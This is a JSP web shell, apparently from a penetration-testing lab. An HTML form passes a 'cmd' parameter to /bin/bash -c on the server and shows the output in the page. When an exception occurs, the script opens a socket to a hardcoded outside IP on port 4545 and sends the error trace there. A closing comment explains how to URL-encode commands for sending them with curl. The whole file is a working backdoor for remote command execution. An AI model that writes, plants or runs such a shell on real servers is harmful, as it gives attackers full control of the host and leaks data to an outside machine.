<FORM METHOD=GET ACTION='cmdjsp_whitebox.jsp'>
<textarea name='cmd' rows="10" cols="120"></textarea>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%
   String thecmd = request.getParameter("cmd");
   String[] cmd = {"/bin/bash","-c",thecmd};
   String output = "";

   if(cmd[2] != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += "<br>" + s;
         }
      }
      catch(IOException e) {
        Socket socket = new Socket("192.168.119.129", 4545);
        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        e.printStackTrace(pw);
        String errors = sw.toString();
        oos.writeObject(errors);
        oos.close();
        e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>
// if by curl/outside of page form, encode cmd parameter with python3 -c "import urllib.parse;print(urllib.parse.quote_plus(input(\":> \")))"
